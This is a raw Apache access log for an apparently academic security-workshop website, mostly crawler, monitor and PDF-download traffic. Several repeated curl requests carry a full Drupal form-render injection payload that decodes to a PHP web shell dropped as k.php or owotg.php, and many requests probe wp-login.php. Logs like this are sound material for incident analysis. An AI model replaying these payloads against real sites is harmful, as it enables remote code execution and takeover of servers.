77.88.47.40 - - [30/Apr/2018:10:21:44 -0400] "GET /node/94 HTTP/1.1" 200 6175 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:10:21:46 -0400] "GET /2018 HTTP/1.1" 200 3512 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
194.187.170.110 - - [30/Apr/2018:10:21:58 -0400] "GET /2003/hold/local.shtml HTTP/1.1" 200 5968 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
93.99.5.24 - - [30/Apr/2018:10:22:46 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
93.99.5.24 - - [30/Apr/2018:10:22:46 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.89 - - [30/Apr/2018:10:23:26 -0400] "GET /papers/2013/nspw2013-peisert.pdf HTTP/1.1" 200 712024 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
52.186.11.100 - - [30/Apr/2018:10:24:23 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20k.php HTTP/1.1" 200 6210 "-" "curl/7.47.0"
52.186.11.100 - - [30/Apr/2018:10:24:23 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20k.php HTTP/1.1" 200 6210 "-" "curl/7.47.0"
203.133.169.137 - - [30/Apr/2018:10:24:32 -0400] "GET /2015/cfp HTTP/1.1" 200 18679 "-" "Mozilla/5.0 (compatible; Daum/4.1; +http://cs.daum.net/faq/15/4118.html?faqId=28966)"
194.187.170.110 - - [30/Apr/2018:10:24:33 -0400] "GET /robots.txt HTTP/1.1" 200 1290 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
194.187.170.110 - - [30/Apr/2018:10:24:34 -0400] "GET / HTTP/1.1" 200 3460 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
203.133.169.137 - - [30/Apr/2018:10:24:56 -0400] "GET /2014 HTTP/1.1" 200 12887 "-" "Mozilla/5.0 (compatible; Daum/4.1; +http://cs.daum.net/faq/15/4118.html?faqId=28966)"
201.183.151.49 - - [30/Apr/2018:10:25:06 -0400] "GET /wp-login.php HTTP/1.1" 404 8180 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
201.183.151.49 - - [30/Apr/2018:10:25:06 -0400] "GET / HTTP/1.1" 200 8298 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [30/Apr/2018:10:25:09 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
123.246.195.195 - - [30/Apr/2018:10:25:13 -0400] "GET /wp-login.php HTTP/1.1" 404 8018 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
123.246.195.195 - - [30/Apr/2018:10:25:14 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
203.133.169.137 - - [30/Apr/2018:10:25:21 -0400] "GET /2015/accepted HTTP/1.1" 200 12999 "-" "Mozilla/5.0 (compatible; Daum/4.1; +http://cs.daum.net/faq/15/4118.html?faqId=28966)"
109.168.187.161 - - [30/Apr/2018:10:25:31 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
203.133.169.137 - - [30/Apr/2018:10:25:32 -0400] "GET /2015/program HTTP/1.1" 200 15687 "-" "Mozilla/5.0 (compatible; Daum/4.1; +http://cs.daum.net/faq/15/4118.html?faqId=28966)"
109.168.187.161 - - [30/Apr/2018:10:25:33 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
180.76.15.157 - - [30/Apr/2018:10:26:24 -0400] "GET /themes/garland/style.css?p7kfx6 HTTP/1.1" 200 24549 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
59.124.153.166 - - [30/Apr/2018:10:27:32 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6216 "-" "curl/7.47.0"
59.124.153.166 - - [30/Apr/2018:10:27:32 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6214 "-" "curl/7.47.0"
66.249.73.91 - - [30/Apr/2018:10:28:00 -0400] "GET /papers/2009/nspw2009-verendel.pdf HTTP/1.1" 200 159425 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
103.84.83.2 - - [30/Apr/2018:10:29:42 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
103.84.83.2 - - [30/Apr/2018:10:29:44 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [30/Apr/2018:10:30:09 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
216.244.66.236 - - [30/Apr/2018:10:30:27 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
66.249.73.91 - - [30/Apr/2018:10:32:33 -0400] "GET /2005/local.content HTTP/1.1" 200 3963 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
160.177.121.31 - - [30/Apr/2018:10:32:38 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
160.177.121.31 - - [30/Apr/2018:10:32:39 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
179.252.137.232 - - [30/Apr/2018:10:34:30 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
179.252.137.232 - - [30/Apr/2018:10:34:32 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
52.186.11.100 - - [30/Apr/2018:10:34:55 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20k.php HTTP/1.1" 200 6211 "-" "curl/7.47.0"
52.186.11.100 - - [30/Apr/2018:10:34:55 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20k.php HTTP/1.1" 200 6213 "-" "curl/7.47.0"
69.162.124.227 - - [30/Apr/2018:10:35:09 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
40.77.167.210 - - [30/Apr/2018:10:35:07 -0400] "GET /papers/2009/nspw2009-misra.pdf HTTP/1.1" 200 433230 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.73.91 - - [30/Apr/2018:10:35:19 -0400] "GET /papers/1999/nspw1999-olthoff-2.pdf HTTP/1.1" 200 162187 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
187.113.188.150 - - [30/Apr/2018:10:35:54 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
187.113.188.150 - - [30/Apr/2018:10:35:56 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.87 - - [30/Apr/2018:10:37:06 -0400] "GET /papers/2001/nspw2001-raskin.pdf HTTP/1.1" 200 512638 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
35.226.23.240 - - [30/Apr/2018:10:38:27 -0400] "GET /robots.txt HTTP/1.1" 200 4480 "-" "ltx71 - (http://ltx71.com/)"
129.2.180.77 - - [30/Apr/2018:10:39:00 -0400] "GET /2009/proceedings/2009/nspw2009-herley.pdf HTTP/1.1" 200 189209 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.2.180.77 - - [30/Apr/2018:10:39:01 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.2.180.77 - - [30/Apr/2018:10:39:01 -0400] "GET /favicon.ico HTTP/1.1" 404 857 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
129.2.180.77 - - [30/Apr/2018:10:39:01 -0400] "GET /2009/proceedings/2009/nspw2009-herley.pdf HTTP/1.1" 206 66025 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
69.162.124.227 - - [30/Apr/2018:10:40:09 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [30/Apr/2018:10:41:11 -0400] "GET /favicon.ico HTTP/1.1" 404 4123 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:10:41:13 -0400] "GET /2005/tmp/?C=M;O=A HTTP/1.1" 403 542 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:10:41:23 -0400] "GET /2009/sg.txt HTTP/1.1" 200 4885 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:10:41:25 -0400] "GET /node/59 HTTP/1.1" 200 3365 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:10:41:27 -0400] "GET /papers/2004/?C=D;O=A HTTP/1.1" 200 940 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:10:41:30 -0400] "GET /papers/2004/?C=M;O=A HTTP/1.1" 200 945 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:10:41:33 -0400] "GET /papers/2004/?C=N;O=D HTTP/1.1" 200 942 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:10:41:35 -0400] "GET /papers/2004/?C=S;O=A HTTP/1.1" 200 942 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:10:41:38 -0400] "GET /2009/proceedings/1997/?C=N;O=D HTTP/1.1" 200 936 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.91 - - [30/Apr/2018:10:41:39 -0400] "GET /2018 HTTP/1.1" 200 6905 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [30/Apr/2018:10:41:40 -0400] "GET /2009/proceedings/1998/?C=D;O=D HTTP/1.1" 200 936 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:10:41:43 -0400] "GET /2009/proceedings/1998/?C=N;O=D HTTP/1.1" 200 936 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:10:41:45 -0400] "GET /2009/proceedings/1998/?C=M;O=D HTTP/1.1" 200 937 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:10:42:08 -0400] "GET /2009/proceedings/1997/?C=S;O=D HTTP/1.1" 200 4358 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:10:42:26 -0400] "GET /2009/proceedings/1997/?C=M;O=D HTTP/1.1" 200 4363 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
115.133.15.14 - - [30/Apr/2018:10:42:32 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
115.133.15.14 - - [30/Apr/2018:10:42:34 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
171.76.39.155 - - [30/Apr/2018:10:43:30 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
171.76.39.155 - - [30/Apr/2018:10:43:33 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [30/Apr/2018:10:45:09 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.87 - - [30/Apr/2018:10:46:15 -0400] "GET /papers/2001/nspw2001-brostoff.pdf HTTP/1.1" 200 1048585 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.102.6.197 - - [30/Apr/2018:10:47:28 -0400] "GET /papers/2011/nspw2011-pieters.pdf HTTP/1.1" 200 2771026 "http://www.google.com/search" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36"
216.244.66.200 - - [30/Apr/2018:10:48:30 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
180.87.210.110 - - [30/Apr/2018:10:48:36 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
180.87.210.110 - - [30/Apr/2018:10:48:37 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.91 - - [30/Apr/2018:10:49:07 -0400] "GET /current/index.shtml HTTP/1.1" 404 8012 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [30/Apr/2018:10:50:09 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.87 - - [30/Apr/2018:10:50:46 -0400] "GET /papers/2010/nspw2010-lilien.pdf HTTP/1.1" 200 740643 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [30/Apr/2018:10:55:09 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.87 - - [30/Apr/2018:10:55:19 -0400] "GET /2005/oc.shtml HTTP/1.1" 200 5363 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
40.77.167.170 - - [30/Apr/2018:10:57:16 -0400] "GET /papers/2007/nspw2007-gay.pdf HTTP/1.1" 200 269089 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.73.89 - - [30/Apr/2018:10:59:54 -0400] "GET /papers/1999/nspw1999-henning.pdf HTTP/1.1" 200 666930 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [30/Apr/2018:11:00:09 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
71.191.220.4 - - [30/Apr/2018:11:01:00 -0400] "GET /2009/proceedings/2009/nspw2009-herley.pdf HTTP/1.1" 200 189209 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
71.191.220.4 - - [30/Apr/2018:11:01:01 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "https://www.nspw.org/2009/proceedings/2009/nspw2009-herley.pdf" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
66.249.73.87 - - [30/Apr/2018:11:04:26 -0400] "GET /2009/proceedings/2010/nspw2010-bishop.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
203.133.169.137 - - [30/Apr/2018:11:04:35 -0400] "GET /robots.txt HTTP/1.1" 200 5853 "-" "Mozilla/5.0 (compatible; Daum/4.1; +http://cs.daum.net/faq/15/4118.html?faqId=28966)"
203.133.169.137 - - [30/Apr/2018:11:04:47 -0400] "GET /2013 HTTP/1.1" 200 12983 "-" "Mozilla/5.0 (compatible; Daum/4.1; +http://cs.daum.net/faq/15/4118.html?faqId=28966)"
65.49.2.175 - - [30/Apr/2018:11:04:59 -0400] "GET /2012/ HTTP/1.1" 200 6606 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
65.49.2.175 - - [30/Apr/2018:11:05:03 -0400] "GET /node/70 HTTP/1.1" 200 6734 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
65.49.2.175 - - [30/Apr/2018:11:05:06 -0400] "GET /2009/ HTTP/1.1" 200 5125 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
65.49.2.175 - - [30/Apr/2018:11:05:09 -0400] "GET / HTTP/1.1" 200 6334 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
69.162.124.227 - - [30/Apr/2018:11:05:09 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
52.186.11.100 - - [30/Apr/2018:11:05:47 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20k.php HTTP/1.1" 200 6209 "-" "curl/7.47.0"
52.186.11.100 - - [30/Apr/2018:11:05:47 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20k.php HTTP/1.1" 200 6212 "-" "curl/7.47.0"
77.88.47.40 - - [30/Apr/2018:11:06:19 -0400] "GET /login HTTP/1.1" 200 6294 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.93 - - [30/Apr/2018:11:06:46 -0400] "GET /ylkdowphwvxacuy.html HTTP/1.1" 404 8001 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [30/Apr/2018:11:08:59 -0400] "GET /papers/2010/nspw2010-alsaleh.pdf HTTP/1.1" 200 1019662 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [30/Apr/2018:11:10:09 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [30/Apr/2018:11:10:39 -0400] "GET /papers/2001/nspw2001-sekar.pdf HTTP/1.1" 200 760504 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:11:11:21 -0400] "GET /sponsors-2010 HTTP/1.1" 200 3069 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:11:11:24 -0400] "GET /2002/oc.content HTTP/1.1" 200 2903 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:11:12:07 -0400] "GET /2015/cfp HTTP/1.1" 200 9343 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
199.16.157.181 - - [30/Apr/2018:11:12:18 -0400] "GET /robots.txt HTTP/1.1" 200 5699 "-" "Twitterbot/1.0"
66.249.73.89 - - [30/Apr/2018:11:13:33 -0400] "GET /papers/2010/nspw2010-sun.pdf HTTP/1.1" 200 6651261 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [30/Apr/2018:11:15:09 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
216.244.66.236 - - [30/Apr/2018:11:17:23 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
66.249.73.89 - - [30/Apr/2018:11:18:06 -0400] "GET /papers/2001/nspw2001-yan.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
27.187.77.63 - - [30/Apr/2018:11:18:26 -0400] "GET /favicon.ico HTTP/1.1" 404 4142 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 LBBROWSER"
77.88.47.40 - - [30/Apr/2018:11:19:13 -0400] "GET /node/9 HTTP/1.1" 200 8358 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
59.124.153.166 - - [30/Apr/2018:11:19:57 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6212 "-" "curl/7.47.0"
59.124.153.166 - - [30/Apr/2018:11:19:57 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6212 "-" "curl/7.47.0"
69.162.124.227 - - [30/Apr/2018:11:20:09 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [30/Apr/2018:11:20:34 -0400] "GET /2004/papers.content HTTP/1.1" 200 6247 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.89 - - [30/Apr/2018:11:22:40 -0400] "GET /2009/proceedings/2003/nspw2003-perrin.pdf HTTP/1.1" 304 3606 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [30/Apr/2018:11:25:09 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [30/Apr/2018:11:25:50 -0400] "GET /robots.txt HTTP/1.1" 200 5979 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:11:25:54 -0400] "GET /2009/proceedings/2006/?C=S;O=D HTTP/1.1" 200 898 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
220.181.125.142 - - [30/Apr/2018:11:26:08 -0400] "GET / HTTP/1.0" 400 0 "-" "-"
220.181.125.142 - - [30/Apr/2018:11:26:09 -0400] "GET /proceedings/1997 HTTP/1.1" 200 6189 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
66.249.73.91 - - [30/Apr/2018:11:27:13 -0400] "GET /2005/submission.shtml HTTP/1.1" 200 5568 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
191.189.21.165 - - [30/Apr/2018:11:27:34 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
191.189.21.165 - - [30/Apr/2018:11:27:34 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
